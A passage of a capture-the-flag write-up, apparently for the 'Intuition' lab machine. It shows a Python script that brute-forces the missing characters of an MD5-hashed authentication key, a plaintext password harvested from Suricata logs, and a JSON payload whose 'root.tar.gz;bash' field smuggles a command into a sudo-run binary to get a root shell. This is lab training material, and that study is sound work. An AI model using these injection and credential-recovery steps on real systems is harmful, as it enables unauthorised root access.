HHBH0HHH^THH`H`uHlIǅLHǅXZHh@uKHhHHHHHt)L;TuHhHHX'LH`HbHhHhuH`HHXtHXHHuHdH0HHH2uH0HHHL(H0HHHǸ5HUdH+%(t%02x0feda17076d793c2ef2870d7427ad4ed /opt/playbooks/Failed to open the playbook directory.yml%d: %s /opt/playbooks/inventory.ini/usr/bin/ansible-playbook%s -i %s %s%s/usr/bin/ansible-galaxy%s install %sUsage: %s [list|run playbook_number|install role_url] -a <auth_key>
....snip....
```

runner1.c - This code looks like it's designed to interact with Ansible

```c                                                                                                                   
// Version : 1
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <openssl/md5.h>
#define INVENTORY_FILE "/opt/playbooks/inventory.ini"
#define PLAYBOOK_LOCATION "/opt/playbooks/"
#define ANSIBLE_PLAYBOOK_BIN "/usr/bin/ansible-playbook"
#define ANSIBLE_GALAXY_BIN "/usr/bin/ansible-galaxy"
#define AUTH_KEY_HASH "0feda17076d793c2ef2870d7427ad4ed"

int check_auth(const char* auth_key) {
    unsigned char digest[MD5_DIGEST_LENGTH];
    MD5((const unsigned char*)auth_key, strlen(auth_key), digest);

    char md5_str[33];
    for (int i = 0; i < 16; i++) {
        sprintf(&md5_str[i*2], "%02x", (unsigned int)digest[i]);
    }                                                                                                                                    

    if (strcmp(md5_str, AUTH_KEY_HASH) == 0) {
        return 1;
    } else {
        return 0;
    }
}
....snip....
```

The authentication key in the script is missing the last four characters: `UHI75GHI****`

```bash
$ cat run-tests.sh 
#!/bin/bash

# List playbooks
./runner1 list

# Run playbooks [Need authentication]
# ./runner run [playbook number] -a [auth code]
#./runner1 run 1 -a "UHI75GHI****"

# Install roles [Need authentication]
# ./runner install [role url] -a [auth code]
#./runner1 install http://role.host.tld/role.tar -a "UHI75GHI****"
```

Python script to find the missing characters by brute-forcing all possible combinations

```python
import hashlib
import itertools

AUTH_KEY_HASH = "0feda17076d793c2ef2870d7427ad4ed"
AUTH_KEY_prefix = "UHI75GHI"

def calculate_md5(input_string):
    return hashlib.md5(input_string.encode()).hexdigest()

all_chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
combinations = itertools.product(all_chars, repeat=4)

for combo in combinations:
    last_4_chars = ''.join(combo)
    candidate_key = AUTH_KEY_prefix + last_4_chars
    if calculate_md5(candidate_key) == AUTH_KEY_HASH:
        print(f"AUTH_KEY: {candidate_key}")
        break
else:
    print("AUTH_KEY not found")
```

Bingo! The missing characters are `NKOP`, making the authentication key `UHI75GHINKOP`

```bash
$ python3 key.py 
AUTH_KEY: UHI75GHINKOP
```

I checked the `/opt` directory to see if there were any interesting Ansible playbooks, I found several directories: `containerd`, `ftp`, `google`, `playbooks`, and `runner2`. However, they were owned by either `root` or `sys-adm`, making it difficult to access them directly

```bash
dev_acc@intuition:/opt$ ls -la
total 28
drwxr-xr-x  7 root root    4096 Apr 10 08:21 .
drwxr-xr-x 19 root root    4096 Apr 10 07:40 ..
drwx--x--x  4 root root    4096 Aug 26  2023 containerd
drwxr-xr-x  4 root root    4096 Sep 19  2023 ftp
drwxr-xr-x  3 root root    4096 Apr 10 08:21 google
drwxr-x---  2 root sys-adm 4096 Apr 10 08:21 playbooks
drwxr-x---  2 root sys-adm 4096 Apr 10 08:21 runner2
dev_acc@intuition:/opt$ 
```

I decided to download and run Linpeas, it found a directory, `/var/log/suricata/`, which seemed promising. I used `zgrep` to search through the compressed logs for the string `lopez`

```bash
dev_acc@intuition:/var/log/suricata$ zgrep -i lopez *.gz
eve.json.8.gz:{"timestamp":"2023-09-28T17:43:36.099184+0000","flow_id":1988487100549589,"in_iface":"ens33","event_type":"ftp","src_ip":"192.168.227.229","src_port":37522,"dest_ip":"192.168.227.13","dest_port":21,"proto":"TCP","tx_id":1,"community_id":"1:SLaZvboBWDjwD/SXu/SOOcdHzV8=","ftp":{"command":"USER","command_data":"lopez","completion_code":["331"],"reply":["Username ok, send password."],"reply_received":"yes"}}
eve.json.8.gz:{"timestamp":"2023-09-28T17:43:52.999165+0000","flow_id":1988487100549589,"in_iface":"ens33","event_type":"ftp","src_ip":"192.168.227.229","src_port":37522,"dest_ip":"192.168.227.13","dest_port":21,"proto":"TCP","tx_id":2,"community_id":"1:SLaZvboBWDjwD/SXu/SOOcdHzV8=","ftp":{"command":"PASS","command_data":"Lopezz1992%123","completion_code":["530"],"reply":["Authentication failed."],"reply_received":"yes"}}
```

Aha! It seems like someone tried to log in to the FTP server using the username `lopez` and the password `Lopezz1992%123`. This could be our ticket to the root shell
## SSH

I am able to ssh with the `lopez` credentials was found from `suricata` logs 

```bash
$ ssh lopez@10.10.11.15
lopez@10.10.11.15s password: 
lopez@intuition:~$ whoami
lopez
lopez@intuition:~$ 
```

### Shell as lopez

First, I used `sudo -l` to see what commands the `lopez` user could run with elevated privileges

```bash
lopez@intuition:/opt$ sudo -l
[sudo] password for lopez: 
Sorry, try again.
[sudo] password for lopez: 
Matching Defaults entries for lopez on intuition:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User lopez may run the following commands on intuition:
    (ALL : ALL) /opt/runner2/runner2
lopez@intuition:/opt$ 
```

The `lopez` user can run the `/opt/runner2/runner2` executable with any user and any group

```bash
lopez@intuition:/opt$ ls -la
total 28
drwxr-xr-x  7 root root    4096 Apr 10 08:21 .
drwxr-xr-x 19 root root    4096 Apr 10 07:40 ..
drwx--x--x  4 root root    4096 Aug 26  2023 containerd
drwxr-xr-x  4 root root    4096 Sep 19  2023 ftp
drwxr-xr-x  3 root root    4096 Apr 10 08:21 google
drwxr-x---  2 root sys-adm 4096 Apr 10 08:21 playbooks
drwxr-x---  2 root sys-adm 4096 Apr 10 08:21 runner2
lopez@intuition:/opt$ cd runner2/
lopez@intuition:/opt/runner2$ ls -la
total 28
drwxr-x--- 2 root sys-adm  4096 Apr 10 08:21 .
drwxr-xr-x 7 root root     4096 Apr 10 08:21 ..
-rwxr-xr-x 1 root root    17448 Oct 21  2023 runner2
lopez@intuition:/opt/runner2$ 
```

## Reversing the runner2

I copied the `runner2` executable to my machine and fired up Ghidra

```bash
$ file runner2 
runner2: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e1d85ed284e278ad7ab92c2208e4d34cbdceec24, for GNU/Linux 3.2.0, not stripped
```

### Analysing in ghidra

I am NOT a reverse engineer; so here is my basic understanding of the `runner2` 

**CLI Argument** - The `runner2` executable takes one command-line argument, a JSON file

```c
if (arg_count != 2) {
  printf("Usage: %s <json_file>\n",*arg_values);
  return 1;
}
```

**JSON Parsing** - It reads the JSON file and loads the data into a variable called `json_data`

```c
json_file_stream = fopen((char *)arg_values[1],"r");
if (json_file_stream == (FILE *)0x0) {
  perror("Failed to open the JSON file");
  return 1;
}
json_data = json_loadf(json_file_stream,2,0);
fclose(json_file_stream);
if (json_data == 0) {
  fwrite("Error parsing JSON data.\n",1,0x19,stderr);
  return 1;
}
```

**Key Validation** - It checks if the JSON data has the required keys: "run" and "auth_code." If any of these keys are missing or invalid, it throws an error and exits

```c
run_key_obj = (int *)json_object_get(json_data,&DAT_00102148);
if ((run_key_obj == (int *)0x0) || (*run_key_obj != 0)) {
  fwrite("Run key missing or invalid.\n",1,0x1c,stderr);
}
else {
  action_key_obj = (int *)json_object_get(run_key_obj,"action");
  if ((action_key_obj == (int *)0x0) || (*action_key_obj != 2)) {
    fwrite("Action key missing or invalid.\n",1,0x1f,stderr);
  }
  else {
    // based on the value of 'action'
}
```

**Action-Based Execution** - The executable then checks the value of the "action" key and calls the appropriate function based on that action

```c
action_str = (char *)json_string_value(action_key_obj);
comparison_result = strcmp(action_str,"list");
if (comparison_result == 0) {
  listPlaybooks();
}
else if (comparison_result == 0) {
  // run - action
}
else if (comparison_result == 0) {
  // install - action
}
else {
  fwrite("Invalid \'action\' value.\n",1,0x18,stderr);
}
```

Looking into `runner2` executable reads a JSON file, performs some validation, and then executes an action based on the value of the "action" key. We need to figure out how to manipulate this process to get root access
## Shell as Root

I created a JSON file called `root.json` to exploit this vulnerability

-  **Action** - The `action` key is set to "install"
-  **Role File** - The `role_file` key is set to `root.tar.gz;bash`. The  `;bash` part is the trick! It tells the `runner2` executable to execute a shell command after installing the role
-  **Auth Code** - The `auth_code` key is set to `UHI75GHINKOP`, the authentication key we found earlier

```json
{
	"run":{
		"action": "install",
		"role_file": "root.tar.gz;bash"
	},
	"auth_code": "UHI75GHINKOP"
}
```

#### Role file

I created a fake role file called `root.tar.gz`, which is actually a compressed directory containing a script that executes a shell. This script will be executed after the `runner2` executable attempts to install the fake role

To create this role file, I created an empty directory called `test` with two subdirectories, `task` and `template`. Then, I used `tar` to create a compressed archive

```bash
$ tar -czvf test.tar.gz test                                                                                                           
test/
test/task/
test/template/
```

I renamed the `test.tar.gz` file to `root.tar.gz;bash` and uploaded it to the server. Now, all we have to do is run the `runner2` executable with the `root.json` file. And there it is! We have a root shell. The `runner2` executable attempted to install the fake role but failed because the URL was invalid. However, the `;bash` command in the `role_file` was still executed, giving us a root shell

```bash
lopez@intuition:/dev/shm$ sudo /opt/runner2/runner2 root.json 
Starting galaxy role install process
[WARNING]: - root.tar.gz was NOT installed successfully: Unknown error when attempting to call Galaxy at
'https://galaxy.ansible.com/api/': <urlopen error [Errno -3] Temporary failure in name resolution>
ERROR! - you can use --ignore-errors to skip failed roles and finish processing the list.
root@intuition:/dev/shm# whoami
root
root@intuition:/dev/shm# 
root@intuition:/dev/shm# cat /root/root.txt 
77aa026c557f5eb152b62cc0010e2a27
root@intuition:/dev/shm# 
```

root.txt

```text
77aa026c...
```